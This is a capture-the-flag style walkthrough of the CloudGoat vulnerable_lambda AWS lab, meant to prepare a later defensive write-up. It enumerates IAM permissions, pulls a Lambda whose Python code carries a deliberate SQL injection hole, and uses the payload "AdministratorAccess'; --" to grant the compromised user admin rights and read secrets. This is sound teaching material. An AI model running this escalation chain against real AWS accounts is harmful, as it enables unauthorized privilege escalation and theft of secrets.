---
title:  "CloudGoat Vulnerable Lambda Scenario - Part 1 (Attack)"
description: 
date: 2023-02-07 22:06:49-05:00
categories: [Cloud, AWS] 
tags: [aws, cloud, lab, walkthrough]
toc: true
---

![cloudgoat](/assets/img/cloudgoat.webp){: .center-image}

## What is CloudGoat?

[CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat) is a purposely 
vulnerable AWS lab open sourced by 
[Rhino Security Labs](https://rhinosecuritylabs.com/) to provide an easily 
deployable and approachable way for users to practice their offensive cloud
security techniques. 

## How is _this_ walk-through different?

Truth be told, Rhino Security Labs provides an official walk-through for each
CloudGoat scenario (e.g., [vulnerable](https://rhinosecuritylabs.com/cloud-security/cloudgoat-vulnerable-lambda-functions/) 
[lambda](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/vulnerable_lambda/cheat_sheet.md)), 
and there are a number of "unofficial" walk-throughs available in the form of 
blog posts. However, these walk-throughs focus solely on successfully exploiting
the relevant vulnerabilities. My intention with this series is to go one (or 
two) steps further by showing you how to defend against these attack techniques.
This includes both authoring detections and implementing preventative measures. 
First things first, let's step through the [vulnerable_lambda scenario](https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/vulnerable_lambda) 
with one minor modification. We'll assume the role of an attacker who has 
(somehow) compromised this access key without any additional context (e.g., the 
access key was accidentally leaked as a hard-coded secret in a public GitHub 
repository).

## Setting Up the Development Environment

### CloudGoat Installation and Configuration

[CloudGoat's quick start guide](https://github.com/RhinoSecurityLabs/cloudgoat#quick-start) 
should suffice in getting the scenario up and running, but I'll quickly walk 
through how I set up my configuration. Ensure you've satisfied the 
[documented requirements](https://github.com/RhinoSecurityLabs/cloudgoat#requirements) 
before following along.

### Create Python Virtual Environment

> If you are particularly opinionated about how you configure your environment 
> to use Python and/or Terraform, feel free to skip this section.
{: .prompt-info }

Avoid dependency conflicts by isolating them on a per-project basis with `venv` 
or something similar (e.g., [pyenv](https://github.com/pyenv/pyenv)). Once the 
venv is created, drop into the environment and install CloudGoat's dependencies:  

```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
python -m pip install venv
python -m venv .venv
source .venv/bin/activate
python -m pip install -r requirements.txt
```

### Dedicated AWS Role for CloudGoat Terraform Execution

When using the AWS CLI, I prefer to leverage [`aws-vault`](https://github.com/99designs/aws-vault)
to manage credentials. Ultimately, `aws-vault` uses the OS secure keystore to 
lock down access to these credentials and makes the necessary AWS STS API calls 
to generate temporary credentials for access. This abides by best practice, as
the credentials are not hard-coded on disk in plaintext.

~~In an ideal world, there would be a programmatic way to craft an IAM policy for this Terraform role, but I haven't discovered one that is officially supported and simple to use (e.g., anything that's not running `terraform apply` and playing whack-a-mole with AWS API error messages).~~

[Ian McKay](https://twitter.com/iann0036) to the rescue! We can utilize [iamlive](https://github.com/iann0036/iamlive) 
to dynamically build an IAM policy for the Terraform AWS role that strictly 
abides by the principle of least privilege. [This blog post](https://meirg.co.il/2021/04/23/determining-aws-iam-policies-according-to-terraform-and-aws-cli/) covers the process
of setting up `iamlive` as a Docker container, configuring the appropriate 
environment variables to pass HTTP/HTTPS traffic to its proxy, and collect the
generated IAM policy for use. Unfortunately, executing `cloudgoat.py` and 
passing its AWS API calls to `iamlive` requires a bit of tinkering. Luckily for
you, I've provided the IAM policy we're after below:  

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "sts:GetCallerIdentity",
                "secretsmanager:CreateSecret",
                "secretsmanager:DescribeSecret",
                "secretsmanager:GetResourcePolicy",
                "secretsmanager:PutSecretValue",
                "secretsmanager:GetSecretValue",
                "secretsmanager:DeleteSecret",
                "secretsmanager:TagResource",
                "iam:CreateUser",
                "iam:GetUser",
                "iam:CreateAccessKey",
                "iam:PutUserPolicy",
                "iam:CreateRole",
                "iam:PutRolePolicy",
                "iam:GetRole",
                "iam:ListRolePolicies",
                "iam:GetRolePolicy",
                "iam:ListAttachedRolePolicies",
                "iam:PassRole",
                "iam:GetUserPolicy",
                "iam:ListAccessKeys",
                "iam:DeleteUserPolicy",
                "iam:ListInstanceProfilesForRole",
                "iam:DeleteAccessKey",
                "iam:DeleteRolePolicy",
                "iam:DeleteRole",
                "iam:ListGroupsForUser",
                "iam:DeleteUser",
                "iam:TagUser",
                "iam:TagRole",
                "iam:UpdateUser",
                "lambda:CreateFunction",
                "lambda:GetFunction",
                "lambda:ListVersionsByFunction",
                "lambda:GetFunctionCodeSigningConfig",
                "lambda:DeleteFunction",
                "lambda:TagResource"
            ],
            "Resource": "*"
        }
    ]
}
```

Now that we have the necessary IAM policy document formed, we can create a 
dedicated IAM role and attach this policy:  

```bash
aws-vault exec admin -- aws iam create-role --role-name terraform-cloudgoat \
    --assume-policy-document file://terraform-cloudgoat-assume-policy.json
aws-vault exec admin -- aws iam put-role-policy --role-name terraform-cloudgoat \
    --policy-name vulnerable_lambda --policy-document file://terraform-cloudgoat-policy.json
```

Finally, we'll configure the profile and IP allowlist for CloudGoat and create
the scenario. 

> **NOTE:** If you've configured your CloudGoat AWS account to authenticate via
> assumed role, you'll need to comment out the `profile` attribute within the 
> `aws` provider block in the relevant `provider.tf` file (e.g., [here](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/vulnerable_lambda/terraform/provider.tf#L2) 
> for the vulnerable_lambda scenario).
>
> ```terraform
>   provider "aws" {
>   # profile = var.profile
>   region = var.region
>
>   default_tags {
>     tags = {
>       Name     = "cg-${var.cgid}"
>       Stack    = var.stack-name
>       Scenario = var.scenario-name
>     }
>   }
> ```
{: .prompt-warning }

```bash
./cloudgoat.py config profile
./cloudgoat.py config whitelist --auto
aws-vault exec cloudgoat -- ./cloudgoat.py create vulnerable_lambda
```

- Set the following environment variables to match the creds defined in `start.txt` (e.g., using `export ENV_NAME=value`)
	- `AWS_ACCESS_KEY_ID`
	- `AWS_SECRET_ACCESS_KEY`
- Alternatively, add the creds to aws-vault and set the necessary values in `~/.aws/config`
```bash
aws-vault add bilbo
# input access key ID and secret access key value
cat <<EOF >> ~/.aws/config
[profile bilbo]
region = us-west-2
output = json
EOF
```
- First, we'll want to perform some situational awareness. In a real-life scenario, we would have just compromised the IAM user's static credentials (IAM key), and we'll need to figure out who we are and what we can do (IAM permissions).
- Who am I?
```bash
aws sts get-caller-identity
{
    "UserId": "AIDAW43MRFXBUNEW7N4JI",
    "Account": "REDACTED",
    "Arn": "arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgidlbywef16bt"
}
```
- What groups do I belong to?
```bash
aws iam list-groups-for-user --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt                                                                         
{
    "Groups": []
}
```
- What policies are attached to my user?
```bash
aws iam list-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt
{
    "PolicyNames": [
        "cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer"
    ]
}
```
- What does this policy allow me to do?
```bash
aws iam get-user-policy --policy-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt
{
    "UserName": "cg-bilbo-vulnerable_lambda_cgidlbywef16bt",
    "PolicyName": "cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "",
                "Effect": "Allow",
                "Action": "sts:AssumeRole",
                "Resource": "arn:aws:iam::940877411605:role/cg-lambda-invoker*"
            },
            {
                "Sid": "",
                "Effect": "Allow",
                "Action": [
                    "iam:Get*",
                    "iam:List*",
                    "iam:SimulateCustomPolicy",
                    "iam:SimulatePrincipalPolicy"
                ],
                "Resource": "*"
            }
        ]
    }
}
```
- The name of the role that this IAM user can assume is a bit telling ("cg-lambda-invoker"). If this role was named something else, how could we determine its capabilities?
- Discover the full role name ("cg-lambda-invoker*" is globbed) 
```bash
aws-vault exec bilbo --no-session -- aws iam list-roles --query "Roles[*].RoleName" | grep -i cg-lambda-invoker
    "cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt",
```
- List policies attached to role (what permissions does it have?)
```bash
aws iam list-role-policies --role-name cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt                 
{
    "PolicyNames": [
        "lambda-invoker"
    ]
}
```
- Describe the "lambda-invoker" policy
```bash
aws iam get-role-policy --policy-name lambda-invoker --role-name cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt
{
    "RoleName": "cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt",
    "PolicyName": "lambda-invoker",
    "PolicyDocument": {
        "Statement": [
            {
                "Action": [
                    "lambda:ListFunctionEventInvokeConfigs",
                    "lambda:InvokeFunction",
                    "lambda:ListTags",
                    "lambda:GetFunction",
                    "lambda:GetPolicy"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
                    "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1"
                ]
            },
            {
                "Action": [
                    "lambda:ListFunctions",
                    "iam:Get*",
                    "iam:List*",
                    "iam:SimulateCustomPolicy",
                    "iam:SimulatePrincipalPolicy"
                ],
                "Effect": "Allow",
                "Resource": "*"
            }
        ],
        "Version": "2012-10-17"
    }
}
```
- The easiest way to assume an IAM role using the AWS CLI is configuring the IAM user's credentials in `~/.aws/config` and then adding a second profile that references the first one:  

```conf
[profile bilbo]
region=us-west-2

[profile cg-lambda-invoker]
source_profile=bilbo
role_arn=arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt
```
- **NOTE:** The account number 940877411605 used in the attached user policy for "bilbo" is a red herring. Use your AWS account number instead when configuring the AWS CLI. Otherwise, you'll continually receive AccessDenied errors
	- I'm not sure why this is the case. 
- No Lambda functions are listed when running `aws lambda list-functions --profile cg-lambda-invoker`. That's because the Lambda function was created in a specific region (and not necessarily the one you select in the profile used for CG configuration).
- Check other regions for available Lambda functions:
```bash
aws --profile cg-lambda-invoker lambda list-functions --region us-east-1
{
    "Functions": [
        {
            "FunctionName": "vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1",
            "FunctionArn": "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1",
            "Runtime": "python3.9",
            "Role": "arn:aws:iam::REDACTED:role/vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1",
            "Handler": "main.handler",
            "CodeSize": 991559,
            "Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-01-04T01:38:32.118+0000",
            "CodeSha256": "U982lU6ztPq9QlRmDCwlMKzm4WuOfbpbCou1neEBHkQ=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "c1819257-5ad3-45b4-b1f2-ad6d3ad55e41",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            }
        }
    ]
}
```
- Only one Lambda function exists in that region (lucky us). Let's take a look at its configuration and pull the code using the pre-signed URL:
```bash
aws --profile cg-lambda-invoker lambda get-function --function-name vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1 --region us-east-1
{
    "Configuration": {
        "FunctionName": "vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1",
        "FunctionArn": "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1",
        "Runtime": "python3.9",
        "Role": "arn:aws:iam::REDACTED:role/vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1",
        "Handler": "main.handler",
        "CodeSize": 991559,
        "Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...",
        "Timeout": 3,
        "MemorySize": 128,
        "LastModified": "2023-01-04T01:38:32.118+0000",
        "CodeSha256": "U982lU6ztPq9QlRmDCwlMKzm4WuOfbpbCou1neEBHkQ=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "c1819257-5ad3-45b4-b1f2-ad6d3ad55e41",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        }
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "REDACTED"
    },
    "Tags": {
        "Name": "cg-vulnerable_lambda_cgid6h7zwj2zln",
        "Scenario": "vulnerable-lambda",
        "Stack": "CloudGoat"
    }
}
```

```bash
wget https://REDACTED -O lambda_function

unzip lambda_function -d lambda_function-unzipped
ls lambda_function-unzipped 
bin                                  click_default_group.py      main.py                          pytz-2021.1.dist-info  sqlite_fts4                  tabulate-0.8.9.dist-info
click                                dateutil                    my_database.db                   requirements.txt       sqlite_fts4-1.0.1.dist-info  tabulate.py
click-8.0.1.dist-info                dateutils                   python_dateutil-2.8.2.dist-info  six-1.16.0.dist-info   sqlite_utils
click_default_group-1.2.2.dist-info  dateutils-0.6.12.dist-info  pytz                             six.py                 sqlite_utils-3.17.dist-info
```

- "main.py" seems to be a reasonable starting point:  

```python
import boto3
from sqlite_utils import Database

db = Database("my_database.db")
iam_client = boto3.client('iam')


# db["policies"].insert_all([
#     {"policy_name": "AmazonSNSReadOnlyAccess", "public": 'True'}, 
#     {"policy_name": "AmazonRDSReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AWSLambda_ReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AmazonS3ReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AmazonGlacierReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AmazonRoute53DomainsReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AdministratorAccess", "public": 'False'}
# ])


def handler(event, context):
    target_policys = event['policy_names']
    user_name = event['user_name']
    print(f"target policys are : {target_policys}")

    for policy in target_policys:
        statement_returns_valid_policy = False
        statement = f"select policy_name from policies where policy_name='{policy}' and public='True'"
        for row in db.query(statement):
            statement_returns_valid_policy = True
            print(f"applying {row['policy_name']} to {user_name}")
            response = iam_client.attach_user_policy(
                UserName=user_name,
                PolicyArn=f"arn:aws:iam::aws:policy/{row['policy_name']}"
            )
            print("result: " + str(response['ResponseMetadata']['HTTPStatusCode']))

        if not statement_returns_valid_policy:
            invalid_policy_statement = f"{policy} is not an approved policy, please only choose from approved " \
                                       f"policies and don't cheat. :) "
            print(invalid_policy_statement)
            return invalid_policy_statement

    return "All managed policies were applied as expected."


if __name__ == "__main__":
    payload = {
        "policy_names": [
            "AmazonSNSReadOnlyAccess",
            "AWSLambda_ReadOnlyAccess"
        ],
        "user_name": "cg-bilbo-user"
    }
    print(handler(payload, 'uselessinfo'))
```

- Let's assume that the commented out call to `insert_all` can't be completely trusted. Trust but verify by investigating the `.db` file in the unzipped Lambda function directory:  
```bash
sqlite3 ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1/my_database.db 'select * from policies;'
AmazonSNSReadOnlyAccess|True
AmazonRDSReadOnlyAccess|True
AWSLambda_ReadOnlyAccess|True
AmazonS3ReadOnlyAccess|True
AmazonGlacierReadOnlyAccess|True
AmazonRoute53DomainsReadOnlyAccess|True
AdministratorAccess|False
```
- Using string formatting to dynamically generate a SQL query/statement is almost always a terrible idea. Time to hunt for and exploit a potential SQLi bug.
- In this case, we could prematurely terminate the following SQL statement because the value of `policy` is attacker-controlled, removing the requirement of `public = 'True'`:
	- `statement = f"select policy_name from policies where policy_name='{policy}' and public='True'"`
```bash
aws-vault exec cg-lambda-invoker -- aws lambda invoke --function-name vulnerable_lambda_cgidgfmjd1k7yo-policy_applier_lambda1 --payload '{"policy_names":["AdministratorAccess'\''; --"],"user_name":"cg-bilbo-vulnerable_lambda_cgidgfmjd1k7yo"}' --cli-binary-format raw-in-base64-out response.json --region us-east-1
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```
- Check the contents of the "response.json" file for the output of this function invocation:
```bash
cat response.json                                                             
"All managed policies were applied as expected."
```
- We can verify whether or not our attempt was successful by checking the "bilbo" IAM user for additional policies (beyond the inline user policy created alongside the user):
```bash
aws-vault exec bilbo --no-session -- aws iam list-attached-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidgfmjd1k7yo
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```
- Now that we have full admin access, we can persist, move laterally, pillage secrets and source code, basically anything. Listing secrets in Secrets Manager will retrieve the scenario's flag.

### Using cloudfox

- Assuming we started from the beginning - who am I?

```bash
aws-vault exec bilbo -- aws sts get-caller-identity
{
    "UserId": "AIDAW43MRFXB5YQGO4KP4",
    "Account": "REDACTED",
    "Arn": "arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp"
}
```

- What IAM permissions are attached to this IAM user?

```bash
aws-vault exec bilbo --no-session -- cloudfox aws permissions --principal arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp -o csv     
[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp
[permissions][REDACTED-AIDAW43MRFXB5YQGO4KP4] Enumerating IAM permissions for account REDACTED.
[permissions] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/csv/permissions-custom-1673313531.csv]
[permissions][REDACTED-AIDAW43MRFXB5YQGO4KP4] 5 unique permissions identified.
```

- The loot file reads as follows:

|Service|Principal Type|Name                                     |Policy Type|Policy Name                                                    |Effect|Action                     |Resource                                         |
|-------|--------------|-----------------------------------------|-----------|---------------------------------------------------------------|------|---------------------------|-------------------------------------------------|
|IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |sts:AssumeRole             |arn:aws:iam::940877411605:role/cg-lambda-invoker*|
|IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |iam:Get*                   |*                                                |
|IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |iam:List*                  |*                                                |
|IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |iam:SimulateCustomPolicy   |*                                                |
|IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |iam:SimulatePrincipalPolicy|*                                                |

- What are the cg-lambda-invoker roles?

```bash
aws-vault exec bilbo --no-session -- cloudfox aws principals -o csv
[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp
[principals][REDACTED-AIDAW43MRFXB5YQGO4KP4] Enumerating IAM Users and Roles for account REDACTED.
[principals] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/csv/principals.csv]
```

| Service | Type | Name | Arn |
|-------|------|-----------|-----|
| IAM | User | cg-bilbo-vulnerable_lambda_cgid73or123swp | arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgid73or123swp |
| IAM | Role | vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 | arn:aws:iam::REDACTED:role/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |

- What permissions does the cg-lambda-invoker role have?

```bash
aws-vault exec cg-lambda-invoker -- cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgid73or123swp -o csv            
[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:sts::REDACTED:assumed-role/cg-lambda-invoker-vulnerable_lambda_cgid73or123swp/1673316375681795132
[permissions][REDACTED-AROAW43MRFXBYDQUWHENX_1673316375681795132] Enumerating IAM permissions for account REDACTED.
[permissions] Output written to [cloudfox-output/aws/REDACTED-AROAW43MRFXBYDQUWHENX_1673316375681795132/csv/permissions-custom-1673316377.csv]
```

| Service | Principal Type | Name | Policy Type | Policy Name | Effect | Action | Resource |
|---------|----------------|------|-------------|-------------|--------|--------|----------|
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:ListFunctionEventInvokeConfigs | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:ListFunctionEventInvokeConfigs | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:InvokeFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:InvokeFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:ListTags | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:ListTags | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:GetFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:GetFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:GetPolicy | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:GetPolicy | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:ListFunctions | * |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | iam:Get* | * |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | iam:List* | * |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | iam:SimulateCustomPolicy | * |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | iam:SimulatePrincipalPolicy | * |

- Before we jump right to downloading the Lambda function itself, let's gather some more information:

```bash
aws-vault exec cg-lambda-invoker -- cloudfox aws lambda
[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:sts::474284633539:assumed-role/cg-lambda-invoker-vulnerable_lambda_cgidr0ub7ivite/1675228723550398160
[lambdas][474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160] Enumerating lambdas for account 474284633539.
[lambdas] Status: 21/21 regions complete (4 errors -- For details check /home/dominic/.cloudfox/cloudfox-error.log)
[lambdas] Output written to [cloudfox-output/aws/474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160/table/lambdas.txt]
[lambdas] Output written to [cloudfox-output/aws/474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160/csv/lambdas.csv]
[lambdas][474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160] Loot written to [cloudfox-output/aws/474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160/loot/lambda-get-function-commands.txt]
[lambdas][474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160] 1 lambdas found.

cat cloudfox-output/aws/474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160/csv/lambdas.csv
Service,Region,Resource Arn,Role,isAdminRole?
Lambda,us-east-1,vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1,arn:aws:iam::474284633539:role/vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1,No
```

What kind of permissions does this role have?

```bash
aws-vault exec bilbo --no-session -- cloudfox aws permissions --principal arn:aws:iam::474284633539:role/vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1
[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:iam::474284633539:user/cg-bilbo-vulnerable_lambda_cgidr0ub7ivite
[permissions][474284633539-AIDAW43MRFXBSQU2U7YWI] Enumerating IAM permissions for account 474284633539.
[permissions] Output written to [cloudfox-output/aws/474284633539-AIDAW43MRFXBSQU2U7YWI/table/permissions-custom-1675229085.txt]
[permissions] Output written to [cloudfox-output/aws/474284633539-AIDAW43MRFXBSQU2U7YWI/csv/permissions-custom-1675229085.csv]
[permissions][474284633539-AIDAW43MRFXBSQU2U7YWI] 5 unique permissions identified.
```

The results of the output:

| Service | Principal Type | Name | Policy Type | Policy Name | Effect | Action | Resource |
|---------|----------------|------|-------------|-------------|--------|--------|----------|
| IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | iam:AttachUserPolicy | arn:aws:iam::474284633539:user/cg-bilbo-vulnerable_lambda_cgidr0ub7ivite |
| IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | s3:GetObject | * |
| IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:CreateLogGroup | arn:aws:logs:*:*:* |
| IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:CreateLogStream | arn:aws:logs:*:*:log-group:*:* |
| IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:PutLogEvents | arn:aws:logs:*:*:log-group:*:* |

- The `s3:GetObject` and `iam:AttachUserPolicy` actions are of particular interest, but let's review the code to verify this assumption.
- Luckily for us, cloudfox was kind enough to print out the AWS CLI commands necessary to download the function. We simply need to make some minor tweaks for it to work properly (especially with aws-vault).  

```bash
cat cloudfox-output/aws/REDACTED-AROAW43MRFXBYDQUWHENX_1673316979024011106/loot/lambda-get-function-commands.txt
#############################################
# The profile you will use to perform these commands is most likely not the profile you used to run CloudFox
# Set the $profile environment variable to the profile you are going to use to inspect the buckets.
# E.g., export profile=dev-prod.
#############################################

=============================================
# Lambda Name: vulnerable_lambda_cgid73or123swp-policy_applier_lambda1

# Get function metadata including download location
aws --profile $profile --region us-east-1 lambda get-function --function-name vulnerable_lambda_cgid73or123swp-policy_applier_lambda1
# Download function code to to disk (requires jq and curl) 
mkdir -p ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1
url=`aws --profile $profile lambda get-function --region us-east-1 --function-name vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 | jq .Code.Location | sed s/"//g` && curl "$url" -o ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1.zip
```

- Running the modified commands:
```bash
mkdir -p ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1
url=`aws-vault exec cg-lambda-invoker -- aws lambda get-function --region us-east-1 --function-name vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 | jq .Code.Location | sed s/'"'//g` && curl "$url" -o ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1.zip
unzip ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1.zip -d ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1
```

- Follow the rest of the steps using the previously defined AWS CLI commands.

```bash
aws-vault exec cg-lambda-invoker -- aws lambda invoke --function-name vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 --payload '{"policy_names":["AdministratorAccess'\''; --"],"user_name":"cg-bilbo-vulnerable_lambda_cgid73or123swp"}' --cli-binary-format raw-in-base64-out response.json --region us-east-1
```

- To pillage the "flag" for this scenario (Secrets Manager) after applying the managed admin policy to the bilbo IAM user:
```bash
aws-vault exec bilbo -- cloudfox aws secrets                  
[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp
